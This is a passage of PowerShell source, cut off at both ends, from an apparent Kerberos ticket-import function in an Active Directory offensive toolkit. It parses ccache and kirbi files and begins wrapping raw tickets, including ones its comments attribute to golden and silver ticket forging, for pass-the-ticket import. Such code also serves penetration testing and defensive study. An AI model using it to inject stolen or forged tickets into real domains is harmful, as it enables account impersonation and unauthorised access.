        [byte[]]$SessionKey,

        [Parameter(Mandatory=$false)]
        [int]$SessionKeyType = 18,

        [Parameter(Mandatory=$false)]
        [UInt64]$LUID = 0,

        [Parameter(Mandatory=$false)]
        [string]$Realm,

        [Parameter(Mandatory=$false)]
        [string]$ClientName,

        [Parameter(Mandatory=$false)]
        [string]$ServerName,

        [Parameter(Mandatory=$false)]
        [string]$ServerInstance,

        [Parameter(Mandatory=$false)]
        [datetime]$AuthTime,

        [Parameter(Mandatory=$false)]
        [datetime]$StartTime,

        [Parameter(Mandatory=$false)]
        [datetime]$EndTime,

        [Parameter(Mandatory=$false)]
        [datetime]$RenewTill,

        [Parameter(Mandatory=$false)]
        [byte[]]$TicketFlags
    )

    begin {
        Write-Log "[Import-KerberosTicket] Starting ticket import..."

        # Clear previous metadata to avoid stale data from earlier calls
        $Script:KirbiMetadata = $null
        $Script:CcacheMetadata = $null

        # =====================================================
        # ASN.1 and KRB-CRED FUNCTIONS
        # =====================================================
        # Uses centralized functions from Kerberos-ASN1.ps1:
        # - New-ASN1Sequence, New-ASN1ContextTag, New-ASN1ApplicationTag
        # - New-ASN1Integer, New-ASN1OctetString, New-ASN1GeneralString
        # - New-ASN1GeneralizedTime
        # - Build-KRBCred (for building KRB-CRED structures)

        #region Ccache Parser

        function Parse-CcacheBytes {
            <#
            .SYNOPSIS
                Parses MIT Kerberos ccache data and extracts the first TGT as KRB-CRED.

            .DESCRIPTION
                Ccache file format (MIT Kerberos):
                - Header: version (2 bytes), principal, time offset
                - Credentials: list of credential entries
                - Each credential: client, server, keyblock, times, ticket, authdata

            .NOTES
                File format reference: https://web.mit.edu/kerberos/krb5-devel/doc/formats/ccache_file_format.html
            #>
            param(
                [byte[]]$Bytes
            )

            $bytes = $Bytes
            $offset = 0

            # Helper functions for reading big-endian values
            function Read-UInt16BE {
                param([int]$pos)
                # Bounds check: need 2 bytes
                if ($pos + 2 -gt $bytes.Length) {
                    throw "ccache: Read-UInt16BE out of bounds at position $pos"
                }
                return ([uint16]$bytes[$pos] -shl 8) -bor $bytes[$pos + 1]
            }

            function Read-UInt32BE {
                param([int]$pos)
                # Bounds check: need 4 bytes
                if ($pos + 4 -gt $bytes.Length) {
                    throw "ccache: Read-UInt32BE out of bounds at position $pos"
                }
                return ([uint32]$bytes[$pos] -shl 24) -bor `
                       ([uint32]$bytes[$pos + 1] -shl 16) -bor `
                       ([uint32]$bytes[$pos + 2] -shl 8) -bor `
                       $bytes[$pos + 3]
            }

            function Read-Data {
                param([int]$pos)
                # Read length (with bounds check from Read-UInt32BE)
                $len = Read-UInt32BE -pos $pos
                # Bounds check: ensure data doesn't extend beyond buffer
                if ($pos + 4 + $len -gt $bytes.Length) {
                    throw "ccache: Read-Data length $len extends beyond data at position $pos"
                }
                $data = if ($len -gt 0) { $bytes[($pos + 4)..($pos + 3 + $len)] } else { @() }
                return @{
                    Length = $len
                    Data = $data
                    NextPos = $pos + 4 + $len
                }
            }

            function Read-Principal {
                param([int]$pos, [int]$version)
                $result = @{
                    NameType = 0
                    Components = @()
                    Realm = ""
                    NextPos = $pos
                }

                # Name type (4 bytes)
                $result.NameType = Read-UInt32BE -pos $pos
                $pos += 4

                # Component count (4 bytes)
                $compCount = Read-UInt32BE -pos $pos
                $pos += 4

                # Realm (only in version 4+, in version 3 it's after components)
                if ($version -ge 4) {
                    $realmData = Read-Data -pos $pos
                    $result.Realm = [System.Text.Encoding]::ASCII.GetString($realmData.Data)
                    $pos = $realmData.NextPos
                }

                # Components
                for ($i = 0; $i -lt $compCount; $i++) {
                    $compData = Read-Data -pos $pos
                    $result.Components += [System.Text.Encoding]::ASCII.GetString($compData.Data)
                    $pos = $compData.NextPos
                }

                # In version 3, realm comes after components
                if ($version -lt 4) {
                    $realmData = Read-Data -pos $pos
                    $result.Realm = [System.Text.Encoding]::ASCII.GetString($realmData.Data)
                    $pos = $realmData.NextPos
                }

                $result.NextPos = $pos
                return $result
            }

            # Parse header
            $version = Read-UInt16BE -pos 0
            $offset = 2
            Write-Log "[Parse-CcacheBytes] Ccache version: $version (0x$($version.ToString('X4')))"

            # Normalize version number (0x0504 = version 4, 0x0503 = version 3, etc.)
            $versionNum = $version -band 0x00FF

            # Only support ccache version 3 and 4 (modern MIT Kerberos)
            # Version 1/2 have different structure (pre-2000 MIT Kerberos) and are extremely rare
            if ($versionNum -lt 3 -or $versionNum -gt 4) {
                if ($versionNum -eq 1 -or $versionNum -eq 2) {
                    throw "Ccache version $versionNum is not supported (legacy MIT Kerberos format from pre-2000). Please use a modern tool like 'kcc' or 'ticketConverter.py' to convert to version 4 format."
                }
                throw "Unsupported ccache version: $versionNum (0x$($version.ToString('X4'))). Only version 3 and 4 are supported."
            }

            Write-Log "[Parse-CcacheBytes] Ccache format version: $versionNum"

            # Skip header tags (version 4 only)
            if ($versionNum -eq 4) {
                $headerLen = Read-UInt16BE -pos $offset
                $offset += 2 + $headerLen
                Write-Log "[Parse-CcacheBytes] Skipped $headerLen bytes of v4 header tags"
            }

            # Read default principal
            $defaultPrinc = Read-Principal -pos $offset -version $versionNum
            $offset = $defaultPrinc.NextPos
            Write-Log "[Parse-CcacheBytes] Default principal: $($defaultPrinc.Components -join '/') @ $($defaultPrinc.Realm)"

            # Parse credentials until end of file
            $credentials = @()
            while ($offset -lt $bytes.Length) {
                try {
                    $cred = @{}

                    # Client principal
                    $client = Read-Principal -pos $offset -version $versionNum
                    $cred.ClientRealm = $client.Realm
                    $cred.ClientName = $client.Components -join '/'
                    $offset = $client.NextPos

                    # Server principal
                    $server = Read-Principal -pos $offset -version $versionNum
                    $cred.ServerRealm = $server.Realm
                    $cred.ServerName = $server.Components -join '/'
                    $offset = $server.NextPos

                    # Keyblock
                    $keyType = Read-UInt16BE -pos $offset
                    $offset += 2
                    if ($versionNum -eq 3) {
                        $offset += 2  # padding in v3
                    }
                    $keyData = Read-Data -pos $offset
                    $cred.KeyType = $keyType
                    $cred.SessionKey = $keyData.Data
                    $offset = $keyData.NextPos

                    # Times (4x uint32)
                    $cred.AuthTime = Read-UInt32BE -pos $offset
                    $offset += 4
                    $cred.StartTime = Read-UInt32BE -pos $offset
                    $offset += 4
                    $cred.EndTime = Read-UInt32BE -pos $offset
                    $offset += 4
                    $cred.RenewTill = Read-UInt32BE -pos $offset
                    $offset += 4

                    # is_skey (1 byte)
                    $offset += 1

                    # Ticket flags (4 bytes)
                    $cred.TicketFlags = Read-UInt32BE -pos $offset
                    $offset += 4

                    # Addresses (count + data)
                    $addrCount = Read-UInt32BE -pos $offset
                    $offset += 4
                    for ($i = 0; $i -lt $addrCount; $i++) {
                        $null = Read-UInt16BE -pos $offset  # addrType - skip
                        $offset += 2
                        $addrData = Read-Data -pos $offset
                        $offset = $addrData.NextPos
                    }

                    # Authdata (count + data)
                    $authCount = Read-UInt32BE -pos $offset
                    $offset += 4
                    for ($i = 0; $i -lt $authCount; $i++) {
                        $null = Read-UInt16BE -pos $offset  # authType - skip
                        $offset += 2
                        $authData = Read-Data -pos $offset
                        $offset = $authData.NextPos
                    }

                    # Ticket
                    $ticketData = Read-Data -pos $offset
                    $cred.Ticket = $ticketData.Data
                    $offset = $ticketData.NextPos

                    # Second ticket (for TGS requests)
                    $secondTicketData = Read-Data -pos $offset
                    $offset = $secondTicketData.NextPos

                    Write-Log "[Parse-CcacheBytes] Found credential: $($cred.ServerName) @ $($cred.ServerRealm)"
                    $credentials += $cred
                }
                catch {
                    Write-Log "[Parse-CcacheBytes] Error parsing credential at offset $offset : $_"
                    break
                }
            }

            if ($credentials.Count -eq 0) {
                throw "No credentials found in ccache file"
            }

            # Find TGT (krbtgt/REALM@REALM)
            $tgt = $credentials | Where-Object { $_.ServerName -match '^krbtgt/' } | Select-Object -First 1

            if (-not $tgt) {
                # Fall back to first credential
                Write-Log "[Parse-CcacheBytes] No TGT found, using first credential"
                $tgt = $credentials[0]
            }

            Write-Log "[Parse-CcacheBytes] Selected credential: $($tgt.ServerName) @ $($tgt.ServerRealm)"
            Write-Log "[Parse-CcacheBytes] Session key type: $($tgt.KeyType), length: $($tgt.SessionKey.Length)"
            Write-Log "[Parse-CcacheBytes] Ticket size: $($tgt.Ticket.Length) bytes"

            # Convert Unix timestamps to DateTime (ccache stores times as Unix epoch)
            $unixEpoch = [DateTime]::new(1970, 1, 1, 0, 0, 0, [DateTimeKind]::Utc)
            $AuthTime = if ($tgt.AuthTime -gt 0) { $unixEpoch.AddSeconds($tgt.AuthTime) } else { $null }
            $StartTime = if ($tgt.StartTime -gt 0) { $unixEpoch.AddSeconds($tgt.StartTime) } else { $null }
            $EndTime = if ($tgt.EndTime -gt 0) { $unixEpoch.AddSeconds($tgt.EndTime) } else { $null }
            $RenewTill = if ($tgt.RenewTill -gt 0) { $unixEpoch.AddSeconds($tgt.RenewTill) } else { $null }

            Write-Log "[Parse-CcacheBytes] Ticket times: Auth=$AuthTime, Start=$StartTime, End=$EndTime, Renew=$RenewTill"

            return @{
                Ticket = $tgt.Ticket
                SessionKey = $tgt.SessionKey
                SessionKeyType = $tgt.KeyType
                ClientName = $tgt.ClientName
                ClientRealm = $tgt.ClientRealm
                ServerName = $tgt.ServerName
                ServerRealm = $tgt.ServerRealm
                AuthTime = $AuthTime
                StartTime = $StartTime
                EndTime = $EndTime
                RenewTill = $RenewTill
            }
        }

        #endregion

        #region KRB-CRED Parser (for kirbi files)

        function Parse-KrbCredFile {
            <#
            .SYNOPSIS
                Parses a KRB-CRED (kirbi) file and extracts user/realm information.

            .DESCRIPTION
                KRB-CRED structure (RFC 4120):
                KRB-CRED ::= [APPLICATION 22] SEQUENCE {
                    pvno [0] INTEGER,
                    msg-type [1] INTEGER (22),
                    tickets [2] SEQUENCE OF Ticket,
                    enc-part [3] EncryptedData (contains EncKrbCredPart)
                }

                Ticket ::= [APPLICATION 1] SEQUENCE {
                    tkt-vno [0] INTEGER,
                    realm [1] Realm (GeneralString),
                    sname [2] PrincipalName,
                    enc-part [3] EncryptedData
                }

                For encrypted enc-part (etype != 0), we extract realm from Ticket structure.
                For unencrypted enc-part (etype 0), we can also parse EncKrbCredPart.
            #>
            param(
                [byte[]]$Data
            )

            $result = @{
                ClientName = $null
                ClientRealm = $null
                ServerName = $null
                ServerRealm = $null
                EncryptionType = $null
                AuthTime = $null
                StartTime = $null
                EndTime = $null
                RenewTill = $null
            }

            try {
                # Helper to read ASN.1 length
                function Read-ASN1Length {
                    param([byte[]]$bytes, [int]$offset)
                    if ($offset -ge $bytes.Length) { return @{ Length = 0; BytesConsumed = 0 } }
                    $len = $bytes[$offset]
                    if ($len -lt 128) {
                        return @{ Length = $len; BytesConsumed = 1 }
                    }
                    $numBytes = $len -band 0x7F
                    $len = 0
                    for ($i = 0; $i -lt $numBytes; $i++) {
                        if (($offset + 1 + $i) -ge $bytes.Length) { break }
                        $len = ($len -shl 8) -bor $bytes[$offset + 1 + $i]
                    }
                    return @{ Length = $len; BytesConsumed = 1 + $numBytes }
                }

                # Helper to read GeneralString
                function Read-GeneralString {
                    param([byte[]]$bytes, [int]$offset, [int]$length)
                    if (($offset + $length) -gt $bytes.Length) { return "" }
                    return [System.Text.Encoding]::ASCII.GetString($bytes, $offset, $length)
                }

                # Helper to read INTEGER value
                function Read-ASN1Integer {
                    param([byte[]]$bytes, [int]$offset)
                    if ($offset -ge $bytes.Length -or $bytes[$offset] -ne 0x02) { return @{ Value = 0; NextPos = $offset } }
                    $offset++
                    $lenInfo = Read-ASN1Length -bytes $bytes -offset $offset
                    $offset += $lenInfo.BytesConsumed
                    $value = 0
                    for ($i = 0; $i -lt $lenInfo.Length; $i++) {
                        if (($offset + $i) -ge $bytes.Length) { break }
                        $value = ($value -shl 8) -bor $bytes[$offset + $i]
                    }
                    return @{ Value = $value; NextPos = $offset + $lenInfo.Length }
                }

                # Helper to read GeneralizedTime (Kerberos time format: YYYYMMDDHHmmssZ)
                function Read-KerberosTime {
                    param([byte[]]$bytes, [int]$offset)
                    # GeneralizedTime tag is 0x18
                    if ($offset -ge $bytes.Length -or $bytes[$offset] -ne 0x18) { return $null }
                    $offset++
                    $lenInfo = Read-ASN1Length -bytes $bytes -offset $offset
                    $offset += $lenInfo.BytesConsumed
                    if ($lenInfo.Length -lt 15) { return $null }
                    $timeStr = [System.Text.Encoding]::ASCII.GetString($bytes, $offset, $lenInfo.Length)
                    # Format: YYYYMMDDHHmmssZ
                    try {
                        return [DateTime]::ParseExact($timeStr, "yyyyMMddHHmmssZ", [System.Globalization.CultureInfo]::InvariantCulture, [System.Globalization.DateTimeStyles]::AssumeUniversal)
                    } catch {
                        return $null
                    }
                }

                $pos = 0

                # APPLICATION 22 tag (0x76)
                if ($Data[$pos] -ne 0x76) {
                    Write-Log "[Parse-KrbCredFile] Not a KRB-CRED (tag: 0x$($Data[$pos].ToString('X2')))"
                    return $result
                }
                $pos++
                $lenInfo = Read-ASN1Length -bytes $Data -offset $pos
                $pos += $lenInfo.BytesConsumed

                # SEQUENCE tag (0x30)
                if ($Data[$pos] -ne 0x30) { return $result }
                $pos++
                $lenInfo = Read-ASN1Length -bytes $Data -offset $pos
                $pos += $lenInfo.BytesConsumed

                # We only need the end position for loop boundary
                $krbCredSeqEnd = $pos + $lenInfo.Length

                # Parse top-level sequence elements
                while ($pos -lt $krbCredSeqEnd -and $pos -lt $Data.Length) {
                    if ($pos -ge $Data.Length) { break }
                    $tag = $Data[$pos]

                    # Only process context tags [0] through [3]
                    if ($tag -lt 0xA0 -or $tag -gt 0xA3) {
                        $pos++
                        continue
                    }

                    $pos++
                    if ($pos -ge $Data.Length) { break }

                    $lenInfo = Read-ASN1Length -bytes $Data -offset $pos
                    $pos += $lenInfo.BytesConsumed
                    $elemLen = $lenInfo.Length
                    $elemStart = $pos

                    # Context tag [2] = tickets (SEQUENCE OF Ticket)
                    if ($tag -eq 0xA2) {
                        Write-Log "[Parse-KrbCredFile] Found tickets[2] at offset $elemStart"

                        # tickets is SEQUENCE OF Ticket
                        if ($Data[$elemStart] -eq 0x30) {
                            $ticketsSeqPos = $elemStart + 1
                            $lenInfo = Read-ASN1Length -bytes $Data -offset $ticketsSeqPos
                            $ticketsSeqPos += $lenInfo.BytesConsumed

                            # First Ticket: APPLICATION 1 (0x61)
                            if ($Data[$ticketsSeqPos] -eq 0x61) {
                                $ticketPos = $ticketsSeqPos + 1
                                $lenInfo = Read-ASN1Length -bytes $Data -offset $ticketPos
                                $ticketPos += $lenInfo.BytesConsumed

                                # Ticket is a SEQUENCE
                                if ($Data[$ticketPos] -eq 0x30) {
                                    $ticketPos++
                                    $lenInfo = Read-ASN1Length -bytes $Data -offset $ticketPos
                                    $ticketPos += $lenInfo.BytesConsumed
                                    $ticketSeqEnd = $ticketPos + $lenInfo.Length

                                    # Parse Ticket elements
                                    while ($ticketPos -lt $ticketSeqEnd -and $ticketPos -lt $Data.Length) {
                                        $ticketTag = $Data[$ticketPos]
                                        $ticketPos++

                                        if ($ticketPos -ge $Data.Length) { break }

                                        $lenInfo = Read-ASN1Length -bytes $Data -offset $ticketPos
                                        $ticketPos += $lenInfo.BytesConsumed
                                        $ticketElemLen = $lenInfo.Length
                                        $ticketElemStart = $ticketPos

                                        # Context [1] = realm (Realm = GeneralString)
                                        if ($ticketTag -eq 0xA1) {
                                            # Should be GeneralString (0x1B)
                                            if ($Data[$ticketElemStart] -eq 0x1B) {
                                                $realmPos = $ticketElemStart + 1
                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $realmPos
                                                $realmPos += $lenInfo.BytesConsumed
                                                $result.ServerRealm = Read-GeneralString -bytes $Data -offset $realmPos -length $lenInfo.Length
                                                # For TGT, server realm = client realm
                                                $result.ClientRealm = $result.ServerRealm
                                                Write-Log "[Parse-KrbCredFile] Found realm from Ticket: $($result.ServerRealm)"
                                            }
                                        }

                                        # Context [2] = sname (PrincipalName)
                                        if ($ticketTag -eq 0xA2) {
                                            # PrincipalName is a SEQUENCE
                                            if ($Data[$ticketElemStart] -eq 0x30) {
                                                $snamePos = $ticketElemStart + 1
                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $snamePos
                                                $snamePos += $lenInfo.BytesConsumed
                                                $snameEnd = $snamePos + $lenInfo.Length

                                                # Look for name-string [1] SEQUENCE OF GeneralString
                                                while ($snamePos -lt $snameEnd -and $snamePos -lt $Data.Length) {
                                                    if ($Data[$snamePos] -eq 0xA1) {
                                                        $snamePos++
                                                        $lenInfo = Read-ASN1Length -bytes $Data -offset $snamePos
                                                        $snamePos += $lenInfo.BytesConsumed

                                                        # SEQUENCE OF GeneralString
                                                        if ($Data[$snamePos] -eq 0x30) {
                                                            $snamePos++
                                                            $lenInfo = Read-ASN1Length -bytes $Data -offset $snamePos
                                                            $snamePos += $lenInfo.BytesConsumed

                                                            $nameComponents = @()
                                                            $nameSeqEnd = $snamePos + $lenInfo.Length

                                                            while ($snamePos -lt $nameSeqEnd -and $snamePos -lt $Data.Length) {
                                                                if ($Data[$snamePos] -eq 0x1B) {
                                                                    $snamePos++
                                                                    $lenInfo = Read-ASN1Length -bytes $Data -offset $snamePos
                                                                    $snamePos += $lenInfo.BytesConsumed
                                                                    $nameComponents += Read-GeneralString -bytes $Data -offset $snamePos -length $lenInfo.Length
                                                                    $snamePos += $lenInfo.Length
                                                                } else {
                                                                    $snamePos++
                                                                }
                                                            }

                                                            $result.ServerName = $nameComponents -join '/'
                                                            Write-Log "[Parse-KrbCredFile] Found sname: $($result.ServerName)"

                                                            # For TGT (krbtgt/REALM), extract client name from second component
                                                            # This is the realm, but client name comes from enc-part (not available if encrypted)
                                                        }
                                                        break
                                                    }
                                                    $snamePos++
                                                }
                                            }
                                        }

                                        # Context [3] = enc-part in Ticket (EncryptedData) - get etype
                                        if ($ticketTag -eq 0xA3) {
                                            # EncryptedData is a SEQUENCE
                                            if ($Data[$ticketElemStart] -eq 0x30) {
                                                $encPos = $ticketElemStart + 1
                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $encPos
                                                $encPos += $lenInfo.BytesConsumed

                                                # Look for etype [0] INTEGER
                                                if ($Data[$encPos] -eq 0xA0) {
                                                    $encPos++
                                                    $lenInfo = Read-ASN1Length -bytes $Data -offset $encPos
                                                    $encPos += $lenInfo.BytesConsumed
                                                    $intResult = Read-ASN1Integer -bytes $Data -offset $encPos
                                                    # This is the Ticket's enc-part etype (usually AES256=18)
                                                    $result.EncryptionType = $intResult.Value
                                                    Write-Log "[Parse-KrbCredFile] Found ticket etype: $($result.EncryptionType)"
                                                }
                                            }
                                        }

                                        $ticketPos = $ticketElemStart + $ticketElemLen
                                    }
                                }
                            }
                        }
                    }

                    # Context tag [3] = enc-part of KRB-CRED (EncryptedData containing EncKrbCredPart)
                    if ($tag -eq 0xA3) {
                        Write-Log "[Parse-KrbCredFile] Found enc-part[3] at offset $elemStart"

                        # EncryptedData is a SEQUENCE
                        if ($Data[$elemStart] -eq 0x30) {
                            $encDataPos = $elemStart + 1
                            $lenInfo = Read-ASN1Length -bytes $Data -offset $encDataPos
                            $encDataPos += $lenInfo.BytesConsumed

                            $encPartEtype = 0

                            # Look for etype [0] INTEGER
                            if ($Data[$encDataPos] -eq 0xA0) {
                                $encDataPos++
                                $lenInfo = Read-ASN1Length -bytes $Data -offset $encDataPos
                                $encDataPos += $lenInfo.BytesConsumed
                                $intResult = Read-ASN1Integer -bytes $Data -offset $encDataPos
                                $encPartEtype = $intResult.Value
                                Write-Log "[Parse-KrbCredFile] KRB-CRED enc-part etype: $encPartEtype"
                            }

                            # If etype is 0 (unencrypted), we can parse EncKrbCredPart for client info
                            if ($encPartEtype -eq 0) {
                                Write-Log "[Parse-KrbCredFile] enc-part is unencrypted - parsing EncKrbCredPart"

                                # Find APPLICATION 29 (EncKrbCredPart) in cipher [2]
                                $cipherStart = $elemStart
                                $cipherEnd = $elemStart + $elemLen

                                for ($searchPos = $cipherStart; $searchPos -lt $cipherEnd - 20; $searchPos++) {
                                    if ($Data[$searchPos] -eq 0x7D) {  # APPLICATION 29
                                        Write-Log "[Parse-KrbCredFile] Found EncKrbCredPart at offset $searchPos"

                                        $credPartPos = $searchPos + 1
                                        $lenInfo = Read-ASN1Length -bytes $Data -offset $credPartPos
                                        $credPartPos += $lenInfo.BytesConsumed
                                        $credPartEnd = $credPartPos + $lenInfo.Length

                                        # EncKrbCredPart contains ticket-info[0] SEQUENCE OF KrbCredInfo
                                        # KrbCredInfo contains: key[0], prealm[1], pname[2], ...

                                        # Search for prealm [1] (context tag A1 followed by GeneralString 1B)
                                        for ($i = $credPartPos; $i -lt $credPartEnd - 10; $i++) {
                                            # Look for pattern: A1 (length) 1B (length) (realm string)
                                            if ($Data[$i] -eq 0xA1) {
                                                $tempPos = $i + 1
                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                $tempPos += $lenInfo.BytesConsumed

                                                if ($Data[$tempPos] -eq 0x1B) {
                                                    $tempPos++
                                                    $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                    $tempPos += $lenInfo.BytesConsumed

                                                    if ($lenInfo.Length -gt 0 -and $lenInfo.Length -lt 100) {
                                                        $realm = Read-GeneralString -bytes $Data -offset $tempPos -length $lenInfo.Length
                                                        if ($realm -match '^[A-Za-z0-9\.\-]+$') {
                                                            $result.ClientRealm = $realm
                                                            Write-Log "[Parse-KrbCredFile] Found prealm in EncKrbCredPart: $realm"
                                                            break
                                                        }
                                                    }
                                                }
                                            }
                                        }

                                        # Search for pname [2] (context tag A2 followed by SEQUENCE)
                                        for ($i = $credPartPos; $i -lt $credPartEnd - 15; $i++) {
                                            if ($Data[$i] -eq 0xA2) {
                                                $tempPos = $i + 1
                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                $tempPos += $lenInfo.BytesConsumed

                                                # PrincipalName is SEQUENCE
                                                if ($Data[$tempPos] -eq 0x30) {
                                                    $tempPos++
                                                    $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                    $tempPos += $lenInfo.BytesConsumed
                                                    $pnameEnd = $tempPos + $lenInfo.Length

                                                    # Find name-string [1]
                                                    while ($tempPos -lt $pnameEnd) {
                                                        if ($Data[$tempPos] -eq 0xA1) {
                                                            $tempPos++
                                                            $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                            $tempPos += $lenInfo.BytesConsumed

                                                            # SEQUENCE OF GeneralString
                                                            if ($Data[$tempPos] -eq 0x30) {
                                                                $tempPos++
                                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                                $tempPos += $lenInfo.BytesConsumed

                                                                # First GeneralString is the username
                                                                if ($Data[$tempPos] -eq 0x1B) {
                                                                    $tempPos++
                                                                    $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                                    $tempPos += $lenInfo.BytesConsumed
                                                                    $result.ClientName = Read-GeneralString -bytes $Data -offset $tempPos -length $lenInfo.Length
                                                                    Write-Log "[Parse-KrbCredFile] Found pname in EncKrbCredPart: $($result.ClientName)"
                                                                }
                                                            }
                                                            break
                                                        }
                                                        $tempPos++
                                                    }
                                                    break
                                                }
                                            }
                                        }

                                        # Search for times in KrbCredInfo: authtime[4], starttime[5], endtime[6], renew-till[7]
                                        # Context tags A4, A5, A6, A7 followed by GeneralizedTime (0x18)
                                        for ($i = $credPartPos; $i -lt $credPartEnd - 20; $i++) {
                                            $ctxTag = $Data[$i]
                                            # Look for context tags [4] through [7]
                                            if ($ctxTag -ge 0xA4 -and $ctxTag -le 0xA7) {
                                                $tempPos = $i + 1
                                                if ($tempPos -ge $Data.Length) { continue }
                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                $tempPos += $lenInfo.BytesConsumed
                                                if ($tempPos -ge $Data.Length) { continue }

                                                # Should be GeneralizedTime (0x18)
                                                $timeVal = Read-KerberosTime -bytes $Data -offset $tempPos
                                                if ($null -ne $timeVal) {
                                                    switch ($ctxTag) {
                                                        0xA4 { $result.AuthTime = $timeVal; Write-Log "[Parse-KrbCredFile] Found authtime: $timeVal" }
                                                        0xA5 { $result.StartTime = $timeVal; Write-Log "[Parse-KrbCredFile] Found starttime: $timeVal" }
                                                        0xA6 { $result.EndTime = $timeVal; Write-Log "[Parse-KrbCredFile] Found endtime: $timeVal" }
                                                        0xA7 { $result.RenewTill = $timeVal; Write-Log "[Parse-KrbCredFile] Found renew-till: $timeVal" }
                                                    }
                                                }
                                            }
                                        }

                                        break
                                    }
                                }
                            }
                        }
                    }

                    $pos = $elemStart + $elemLen
                }

                # If we couldn't get client name but have server name krbtgt/REALM, extract username from filename or leave null
                # The client name is only available in encrypted enc-part for Rubeus-generated tickets
                if (-not $result.ClientName -and $result.ServerName -match '^krbtgt/') {
                    Write-Log "[Parse-KrbCredFile] enc-part is encrypted - client name not available without decryption"
                    # For modern kirbi files, client name is in encrypted EncKrbCredPart
                    # We can only get realm from the Ticket structure
                }
            }
            catch {
                Write-Log "[Parse-KrbCredFile] Error parsing KRB-CRED: $_"
            }

            return $result
        }

        #endregion

        #region Load ticket data

        if ($Ccache) {
            # Use ConvertFrom-Base64OrFile to handle both Base64 and file path
            $ccacheResult = ConvertFrom-Base64OrFile -InputValue $Ccache -ExpectedFormat "Ccache" -ParameterName "Ccache"

            if (-not $ccacheResult.Success) {
                throw "Ccache input error: $($ccacheResult.Error)"
            }

            $ccacheBytes = $ccacheResult.Data
            Write-Log "[Import-KerberosTicket] Loaded ccache from $($ccacheResult.Source): $($ccacheBytes.Length) bytes ($($ccacheResult.Format))"

            # Parse the ccache data (need to use bytes, not file path)
            # We need to modify Parse-CcacheFile to accept bytes or use a temp approach
            $ccacheData = Parse-CcacheBytes -Bytes $ccacheBytes

            # Ccache contains raw ticket data - need to wrap in KRB-CRED
            $TicketBytes = $ccacheData.Ticket
            $SessionKey = $ccacheData.SessionKey
            $SessionKeyType = $ccacheData.SessionKeyType

            # Extract realm and names for KRB-CRED building
            if (-not $Realm) { $Realm = $ccacheData.ClientRealm }
            if (-not $ClientName) { $ClientName = $ccacheData.ClientName }
            if (-not $ServerName -and $ccacheData.ServerName -match '^([^/]+)/') {
                $ServerName = $Matches[1]
            }
            if (-not $ServerInstance -and $ccacheData.ServerName -match '/(.+)$') {
                $ServerInstance = $Matches[1]
            }

            # Store metadata for return value (including ticket times)
            $Script:CcacheMetadata = @{
                UserName = $ccacheData.ClientName
                Realm = $ccacheData.ClientRealm
                EncryptionType = $ccacheData.SessionKeyType
                AuthTime = $ccacheData.AuthTime
                StartTime = $ccacheData.StartTime
                EndTime = $ccacheData.EndTime
                RenewTill = $ccacheData.RenewTill
            }

            Write-Log "[Import-KerberosTicket] Loaded ccache: $($ccacheData.ClientName) @ $($ccacheData.ClientRealm)"
        }
        elseif ($Kirbi) {
            # Use ConvertFrom-Base64OrFile to handle both Base64 and file path
            $kirbiResult = ConvertFrom-Base64OrFile -InputValue $Kirbi -ExpectedFormat "Kirbi" -ParameterName "Kirbi"

            if (-not $kirbiResult.Success) {
                throw "Kirbi input error: $($kirbiResult.Error)"
            }

            $TicketBytes = $kirbiResult.Data
            Write-Log "[Import-KerberosTicket] Loaded kirbi from $($kirbiResult.Source): $($TicketBytes.Length) bytes ($($kirbiResult.Format))"

            # Parse kirbi to extract user/realm information and times
            $kirbiData = Parse-KrbCredFile -Data $TicketBytes
            if ($kirbiData.ClientName -or $kirbiData.ClientRealm) {
                $Script:KirbiMetadata = @{
                    UserName = $kirbiData.ClientName
                    Realm = $kirbiData.ClientRealm
                    EncryptionType = $kirbiData.EncryptionType
                    AuthTime = $kirbiData.AuthTime
                    StartTime = $kirbiData.StartTime
                    EndTime = $kirbiData.EndTime
                    RenewTill = $kirbiData.RenewTill
                }
                Write-Log "[Import-KerberosTicket] Parsed kirbi: $($kirbiData.ClientName) @ $($kirbiData.ClientRealm) (etype $($kirbiData.EncryptionType))"
                if ($kirbiData.EndTime) {
                    Write-Log "[Import-KerberosTicket] Ticket endtime: $($kirbiData.EndTime)"
                }
            }
        }
        elseif ($TicketBase64) {
            $TicketBytes = [Convert]::FromBase64String($TicketBase64)
            Write-Log "[Import-KerberosTicket] Decoded Base64 ticket"
        }
        elseif (-not $TicketBytes) {
            throw "You must provide ticket data via -TicketBytes, -TicketBase64, -Kirbi, or -Ccache"
        }

        Write-Log "[Import-KerberosTicket] Ticket size: $($TicketBytes.Length) bytes"

        # Check ticket format by first byte:
        # - 0x76 = APPLICATION 22 = KRB-CRED (already wrapped, ready for import)
        # - 0x66 = APPLICATION 6 = Kerberos Ticket (from New-GoldenTicket, New-SilverTicket)
        # - 0x30 = SEQUENCE = Raw ticket content (from AS-REP parsing, ticket without APPLICATION tag)
        # - 0x61 = APPLICATION 1 = Legacy/alternate ticket format
        $firstByte = if ($TicketBytes.Length -gt 0) { $TicketBytes[0] } else { 0 }
        $isKrbCred = ($firstByte -eq 0x76)
        $isRawTicket = ($firstByte -eq 0x66 -or $firstByte -eq 0x30 -or $firstByte -eq 0x61)

        if ($isKrbCred) {
            Write-Log "[Import-KerberosTicket] Input is already in KRB-CRED format"
            $krbCredBytes = $TicketBytes
        }
        elseif ($isRawTicket) {
            $formatName = switch ($firstByte) {
                0x66 { "APPLICATION 6 (Kerberos Ticket)" }
                0x30 { "SEQUENCE (raw ticket content)" }
                0x61 { "APPLICATION 1 (alternate format)" }
            }
            Write-Log "[Import-KerberosTicket] Input is raw Ticket ($formatName) - building KRB-CRED wrapper"

            if (-not $SessionKey -or $SessionKey.Length -eq 0) {
                throw "SessionKey is required when importing raw ticket bytes. Please provide the session key from the TGT/TGS response."
            }

            # Build parameters for KRB-CRED
            $krbCredParams = @{
                Ticket = $TicketBytes
                SessionKey = $SessionKey
                SessionKeyType = $SessionKeyType
